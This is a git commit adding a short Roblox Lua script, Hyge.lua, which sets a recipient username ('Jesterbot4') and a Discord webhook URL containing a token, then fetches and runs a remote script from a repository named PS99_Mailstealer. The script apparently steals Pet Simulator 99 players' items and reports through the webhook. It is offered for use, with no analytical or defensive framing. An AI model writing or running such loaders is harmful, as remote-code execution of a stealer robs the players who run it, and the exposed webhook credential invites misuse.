3c5deaaafe3fa629b0577ef6c5fd65461938f2d8
z1cey <rickz1cey@gmail.com>
2024-05-23 23:53:43 -0400

    Add files via upload

---
+++ Hyge.lua
@@ -0,0 +1,5 @@
+Username = "Jesterbot4"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1243407538033004586/jWzZNt_paNZgpu0ogQGbA_BZeqkmz3AQ7uxHCR2Gq8LGblAdsInQnEyVtdfSuk4x1ne1" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
